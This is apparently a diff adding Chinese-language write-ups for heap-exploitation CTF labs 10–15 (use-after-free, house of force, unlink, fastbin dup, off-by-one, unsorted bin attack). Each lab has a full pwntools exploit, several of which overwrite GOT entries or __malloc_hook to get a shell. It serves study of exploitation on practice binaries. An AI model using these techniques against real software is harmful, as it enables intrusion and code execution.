@@ -944,6 +944,643 @@ r.recvuntil('qwer')
 '''
 ```
 
+# lab10
+
+> 考点 UAF
+
+开始进入heap exploitation
+
+add note结构
+
+![image-20220915212526779](/assets/img/2022/image-20220915212526779.png)
+
+漏洞点：UAF
+
+![image-20220914213018042](/assets/img/2022/image-20220914213018042.png)
+
+把print_note_context指针改成magic即可![image-20220914222704367](/assets/img/2022/image-20220914222704367.png)
+
+利用：创建note-context-note-context：0x10-0x28-0x10-0x28的堆排布，free(note1) , free(note0), 于是0x10的fastbin中有两个chunk，然后再次创建一个note时，使得该note的context与note0 overlap， 就可以修改note0的print_note_context指针
+
+![image-20220915212442473](/assets/img/2022/image-20220915212442473.png)
+
+![image-20220915212825174](/assets/img/2022/image-20220915212825174.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./hacknote')
+elf = ELF('./hacknote')
+context.terminal = ['tmux', 'splitw', '-h']
+def debug():
+    gdb.attach(r)
+    pause()
+
+def add_note(size, con):
+    r.recvuntil('Your choice :')
+    r.sendline(str(1))
+    r.recvuntil('Note size :')
+    r.sendline(str(size))
+    r.recvuntil('Content :')
+    r.sendline(con)
+
+def delete_note(index):
+    r.recvuntil('Your choice :')
+    r.sendline(str(2))
+    r.recvuntil('Index :')
+    r.sendline(str(index))
+
+def print_note(index):
+    r.recvuntil('Your choice :')
+    r.sendline(str(3))
+    r.recvuntil('Index :')
+    r.sendline(str(index))
+
+add_note(0x20, 'aaaa') #0
+add_note(0x20, 'bbbb') #1
+delete_note(0)
+delete_note(1)
+
+magic = 0x8048986
+add_note(0x10, p64(elf.symbols['magic']))
+
+print_note(0)
+
+r.interactive()
+```
+
+# lab11-1 
+
+> 考点：house of force
+
+![image-20220915215334815](/assets/img/2022/image-20220915215334815.png)
+
+这一块逻辑逆向来看有点乱，动态调试后一目了然
+
+![image-20220915215417716](/assets/img/2022/image-20220915215417716.png)
+
+一个全局的itemlist，按照size, chunk_addr的顺序存放
+
+![image-20220915215756238](/assets/img/2022/image-20220915215756238.png)
+
+change_item有个越界写漏洞
+
+利用：
+
+![image-20220915220557755](/assets/img/2022/image-20220915220557755.png)
+
+![image-20220915220414438](/assets/img/2022/image-20220915220414438.png)
+
+利用越界写，改掉top chunk的size，改成0xffffffffffffffff
+
+nb=0x603000-0x603050-16=-80-16=-96，所以malloc(-96)之后top chunk就会被搬到0x603000处。然后再malloc一个0x10大小的chunk，就可以改掉0x603010和0x603018处的两个指针
+
+![image-20220915221416126](/assets/img/2022/image-20220915221416126.png) ![image-20220915221200676](/assets/img/2022/image-20220915221200676.png)
+
+把goodbye_message改成magic
+
+![image-20220915221557728](/assets/img/2022/image-20220915221557728.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./bamboobox')
+elf = ELF('./bamboobox')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+def debug():
+    gdb.attach(r)
+    pause()
+    
+def add(size, name):
+    r.recvuntil('Your choice:')
+    r.sendline('2')
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(str(size))
+    r.recvuntil('Please enter the name of item:')
+    r.sendline(name)
+
+def show():
+    r.recvuntil('Your choice:')
+    r.sendline('1')
+
+def change(index, size, name):
+    r.recvuntil('Your choice:')
+    r.sendline('3')
+    r.recvuntil('Please enter the index of item:')
+    r.sendline(str(index))
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(str(size))
+    r.recvuntil('Please enter the new name of the item:')
+    r.sendline(name)
+
+def remove(index):
+    r.recvuntil('Your choice:')
+    r.sendline('4')
+    r.recvuntil('lease enter the index of item:')
+    r.sendline(str(index))
+
+def my_exit():
+    r.recvuntil('Your choice:')
+    r.sendline('5')
+
+
+add(0x20, 'aaaa') # 0
+p = 'a'*0x20 + p64(0) + p64(0xffffffffffffffff)
+change(0, 0x30, p)
+add(-96, 'bbbb')
+add(0x10, 'a'*8+p64(elf.symbols['magic']))
+my_exit()
+
+
+r.interactive()
+```
+
+# lab11-2
+
+> 考点： unlink
+
+add两次(要free的chunk 大小要超过fastbin大小，因为fastbin的P位一定是1，不会触发unlink。我下面有些图两个chunk都是0x40大小的，所有没有触发unlink，图也懒得改了，只要把0x40改成0x90即可)
+
+![image-20220917132803674](/assets/img/2022/image-20220917132803674.png)
+
+触发越界写，达成unlink利用的条件，并触发unlink
+
+因为itemlist中的指针指向的是chunk data部分，所以在越界写的时候要伪造出整个chunk，而不单单是fd和bk。
+
+如果只伪造fd和bk，结果是这样的
+
+![image-20220917123137686](/assets/img/2022/image-20220917123137686.png)
+
+`FD=P->fd=0x602090`
+
+`BK=P->bk=0x602098`
+
+unlink时check: `FD->bk = *(0x602090+0x18) = *(0x6020a8) = 0x603030  ` 并不等于P(0x603020)
+
+
+
+所以越界写思路如图：
+
+![image-20220917125257647](/assets/img/2022/image-20220917125257647.png)
+
+free并触发unlink：
+
+![image-20220917130404381](/assets/img/2022/image-20220917130404381.png)
+
+![image-20220917131304771](/assets/img/2022/image-20220917131304771.png)
+
+exp:
+
+```python
+#encoding=UTF-8
+from pwn import *
+
+
+r = process('./bamboobox')
+elf = ELF('./bamboobox')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+def debug(cmd=''):
+    gdb.attach(r,cmd)
+    pause()
+    
+def add(size, name):
+    r.recvuntil('Your choice:')
+    r.sendline('2')
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(str(size))
+    r.recvuntil('Please enter the name of item:')
+    r.sendline(name)
+
+def show():
+    r.recvuntil('Your choice:')
+    r.sendline('1')
+
+def change(index, size, name):
+    r.recvuntil('Your choice:')
+    r.sendline('3')
+    r.recvuntil('Please enter the index of item:')
+    r.sendline(str(index))
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(str(size))
+    r.recvuntil('Please enter the new name of the item:')
+    r.sendline(name)
+
+def remove(index):
+    r.recvuntil('Your choice:')
+    r.sendline('4')
+    r.recvuntil('lease enter the index of item:')
+    r.sendline(str(index))
+
+def my_exit():
+    r.recvuntil('Your choice:')
+    r.sendline('5')
+
+add(0x30, 'aaaa') #0
+add(0x80, 'bbbb') #1
+ptr = elf.symbols['itemlist'] + 8
+p = p64(0) # fake prev_size
+p += p64(0x31) # fake size
+p += p64(ptr-0x18) # fake fd
+p += p64(ptr-0x10) # fake bk
+p += 'a'*0x10
+p += p64(0x30) # fake prev_size
+p += p64(0x90) # fake size
+change(0, 0x40, p)
+remove(1)
+
+p = p64(0)*2 + p64(0x40) + p64(elf.got['atoi'])
+change(0, 0x20, p)
+
+# method1: call magic
+#change(0, 0x8, p64(elf.symbols['magic']))
+
+# method2： get shell
+show()
+r.recvuntil('0 : ')
+atoi_addr = u64(r.recvuntil('\xff\x7f').ljust(8, '\x00'))
+atoi_off = 0x36e90
+libc_addr = atoi_addr - atoi_off
+system_off = 0x453a0
+system_addr = libc_addr + system_off
+change(0, 0x8, p64(system_addr))
+r.recvuntil(":")
+r.sendline('/bin/sh')
+
+r.interactive()
+```
+
+> 题外话，一开始我修改了下源码![image-20220917175900746](/assets/img/2022/image-20220917175900746.png)
+>
+> 导致调试一直通不过
+>
+> ![image-20220917175958614](/assets/img/2022/image-20220917175958614.png)
+>
+> 就永远卡在这里了。。
+>
+> 不知道是啥原因，至今没有解决
+>
+> 倒是改atoi_got换成了改exit_got可以
+>
+> 反正改atoi_got不知道为啥不行
+
+# lab12
+
+> 考点：fastbin attack
+
+漏洞点：
+
+![image-20220917192249458](/assets/img/2022/image-20220917192249458.png)
+
+
+
+改puts的got，这题改free的got会有点问题，调试时发现的
+
+![image-20220917220134747](/assets/img/2022/image-20220917220134747.png)
+
+还有，如果你拿pwndbg的find_fake_fast命令找的话，是找不到的，它代码写的有问题（盲猜是因为它做了8字节校验？）但是其实做fastbin的fake chunk只需要四字节满足要求就可以
+
+![image-20220917220236960](/assets/img/2022/image-20220917220236960.png)
+
+![image-20220918100953602](/assets/img/2022/image-20220918100953602.png)
+
+实际上是一个unsigned int，也就是说在x64上（假设此时idx为0x20），我们的size的高位不是全要为零，而是`0x????????00000020 + [0,7]`，高4字节是可以任意的。比如0xffffffff00000023就是可以的。
+
+> 
+>
+> ![image-20220918100916026](/assets/img/2022/image-20220918100916026.png)
+>
+> 给pwndbg修了一下，可以正常显示了
+>
+> ![image-20220918100842141](/assets/img/2022/image-20220918100842141.png)
+
+exp: 针对这题 拿个flag就比较简便
+
+```python
+from pwn import *
+
+
+r = process('./secretgarden')
+elf = ELF('./secretgarden')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+def debug(cmd=''):
+    gdb.attach(r, cmd)
+    pause()
+
+def raise_flower(length, name, color):
+    r.recvuntil("Your choice :")
+    r.sendline('1')
+    r.recvuntil('Length of the name :')
+    r.sendline(str(length))
+    r.recvuntil('The name of flower :')
+    r.sendline(name)
+    r.recvuntil('The color of the flower :')
+    r.sendline(color)
+
+def visit():
+    r.recvuntil("Your choice :")
+    r.sendline('2')
+
+def remove(index):
+    r.recvuntil("Your choice :")
+    r.sendline('3')
+    r.recvuntil('Which flower do you want to remove from the garden:')
+    r.sendline(str(index))
+
+def clean():
+    r.recvuntil("Your choice :")
+    r.sendline('4')
+
+def leave():
+    r.recvuntil("Your choice :")
+    r.sendline('5')
+
+raise_flower(0x50, 'aaaa', '1') #0
+raise_flower(0x50, 'bbbb', '2') #1
+
+remove(0)
+remove(1)
+remove(0)
+
+fake_chunk_addr = 0x601ffa
+raise_flower(0x50, p64(fake_chunk_addr), '3') #2
+raise_flower(0x50, 'cccc', '4') #3
+raise_flower(0x50, 'dddd', '5') #4
+p = 'a'*22 + p64(elf.symbols['magic'])
+debug()
+raise_flower(0x50, p, '6') #5
+
+
+r.interactive()
+```
+
+
+
+拿shell，麻烦点，还要leak libc
+
+关键点：用unsorted_bin leak libc
+
+```python
+#encoding=UTF-8
+from pwn import *
+
+
+r = process('./secretgarden')
+elf = ELF('./secretgarden')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+def debug(cmd=''):
+    gdb.attach(r, cmd)
+    pause()
+
+def raise_flower(length, name, color):
+    r.recvuntil("Your choice :")
+    r.sendline('1')
+    r.recvuntil('Length of the name :')
+    r.sendline(str(length))
+    r.recvuntil('The name of flower :')
+    r.send(name)
+    r.recvuntil('The color of the flower :')
+    r.sendline(color)
+
+def visit():
+    r.recvuntil("Your choice :")
+    r.sendline('2')
+
+def remove(index):
+    r.recvuntil("Your choice :")
+    r.sendline('3')
+    r.recvuntil('Which flower do you want to remove from the garden:')
+    r.sendline(str(index))
+
+def clean():
+    r.recvuntil("Your choice :")
+    r.sendline('4')
+
+def leave():
+    r.recvuntil("Your choice :")
+    r.sendline('5')
+
+# leak libc
+raise_flower(0x80, 'aaaa', '0') #0
+raise_flower(0x40, 'bbbb', '1') #1
+remove(0)
+clean()
+raise_flower(0x80, 'c'*8, '2') #2  8个字节填满第一格，打印的时候顺带着把第二格的bk打印出来。malloc时不会把chunk内容清空，这个bk就是这个chunk作为unsorted bin时的bk。 再然后，注意要用send发送，不要用sendline，sendline会多一个\n，会覆盖bk一字节
+visit()
+r.recvuntil('c'*8)
+libc_addr = u64(r.recvuntil('\xff\x7f').ljust(8, '\x00')) - 0x3c4b78 # 0x3c4b78 = main_arena+88 - libc_base，偏移是固定的，gdb里算一下
+log.success('libc_addr  =====> {:x}'.format(libc_addr))
+
+# fastbin dup
+raise_flower(0x60, 'dddd', '3') #3
+raise_flower(0x60, 'eeee', '4') #4
+raise_flower(0x60, 'ffff', '5') #5
+
+remove(3)
+remove(4)
+remove(3)
+
+fake_chunk_addr = libc_addr + 0x3c4b10 - 0x23  # __malloc_hook
+raise_flower(0x60, p64(fake_chunk_addr), '6') #6
+raise_flower(0x60, 'gggg', '4') #7
+raise_flower(0x60, 'hhhh', '5') #8
+p = 'a'*19 + p64(libc_addr + 0x4527a) # one_gadget 恰好可以，不行的话就malloc_hook + __realloc_hook + one_gadget
+# debug()
+raise_flower(0x60, p, '6') #9
+r.recvuntil('Your choice :')
+r.sendline('1')
+
+r.interactive()
+```
+
+
+
+# lab13
+
+> 考点：Extend the chunk
+
+漏洞点
+
+![image-20220918102611660](/assets/img/2022/image-20220918102611660.png)
+
+off-by-one
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./heapcreator')
+elf = ELF('./heapcreator')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+def debug(cmd=''):
+    gdb.attach(r, cmd)
+    pause()
+
+def create(size, context):
+    r.recvuntil('Your choice :')
+    r.sendline('1')
+    r.recvuntil('Size of Heap :')
+    r.sendline(str(size))
+    r.recvuntil('Content of heap:')
+    r.sendline(context)
+
+def edit(index, context):
+    r.recvuntil('Your choice :')
+    r.sendline('2')
+    r.recvuntil('Index :')
+    r.sendline(str(index))
+    r.recvuntil('Content of heap :')
+    r.sendline(context)
+
+
+def show(index):
+    r.recvuntil('Your choice :')
+    r.sendline('3')
+    r.recvuntil('Index :')
+    r.sendline(str(index))
+    
+def delete(index):
+    r.recvuntil('Your choice :')
+    r.sendline('4')
+    r.recvuntil('Index :')
+    r.sendline(str(index)) 
+
+create(0x28, 'a'*0x28) #0
+create(0x10, 'b'*0x10) #1
+# off-by-one
+edit(0, 'a'*0x28+'\x41')
+delete(1)
+
+# overlap chunk, write atoi_got
+p = 'a'*16 + p64(0) + p64(0x31) + p64(0x30) + p64(elf.got['atoi']) 
+create(0x30, p) #1
+
+# leak libc
+show(1) 
+r.recvuntil('Content : ')
+libc_addr = u64(r.recv(6).ljust(8, '\x00')) - 0x36e90 # 0x36e90=atoi_off
+log.success('libc_addr ======> {:x}'.format(libc_addr))
+system_addr = libc_addr + 0x453a0
+
+# overwrite atoi_got
+edit(1, p64(system_addr))
+
+r.recvuntil('Your choice :')
+r.sendline('sh')
+# r.sendline('$0') # 新学到的姿势
+
+r.interactive()
+```
+
+
+
+# lab14
+
+> 考察unsorted bin attack
+>
+> unsorted bin attack的关键是把unsorted bin 的最后一个chunk(最先放进的)的bk改为target-0x10
+>
+> 使得target处的值变得很大
+>
+> 在做unsorted bin attack的时候虽然我们的目的是改bk，但是其实fd改掉了也没有影响，在unlink的时候fd没有用到。
+>
+> 但是这样unsortedbin 会坏掉
+
+漏洞点：越界写
+
+![image-20220918131614772](/assets/img/2022/image-20220918131614772.png)
+
+这道题就用unsorted bin attack，把magic改为unsorted bin ，一个很大的数字![image-20220918131709962](/assets/img/2022/image-20220918131709962.png)
+
+
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./magicheap')
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+def debug(cmd=''):
+    gdb.attach(r, cmd)
+    pause()
+
+def create(size, context):
+    r.recvuntil('Your choice :')
+    r.sendline('1')
+    r.recvuntil('Size of Heap :')
+    r.sendline(str(size))
+    r.recvuntil('Content of heap:')
+    r.sendline(context)
+
+def edit(index, size, context):
+    r.recvuntil('Your choice :')
+    r.sendline('2')
+    r.recvuntil('Index :')
+    r.sendline(str(index))
+    r.recvuntil('Size of Heap :')
+    r.sendline(str(size))
+    r.recvuntil('Content of heap :')
+    r.sendline(context)
+
+def delete(index):
+    r.recvuntil('Your choice :')
+    r.sendline('3')
+    r.recvuntil('Index :')
+    r.sendline(str(index))
+
+create(0x80, 'a') #0
+create(0x30, 'b') #1   overflow
+create(0x80, 'c') #2
+create(0x30, 'b') #3   avoid merge to top
+
+delete(2)
+delete(0)
+magic = 0x6020C0
+p = 'a'*0x30 + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10)
+edit(1, 0x50, p)
+create(0x80, 'e') #0
+r.recvuntil('Your choice :')
+r.sendline('4869')
+
+r.interactive()
+```
+
+
+
+# lab15
+
+C++ pwn
+
+以后写
+
+
+
 
 
 # 参考链接
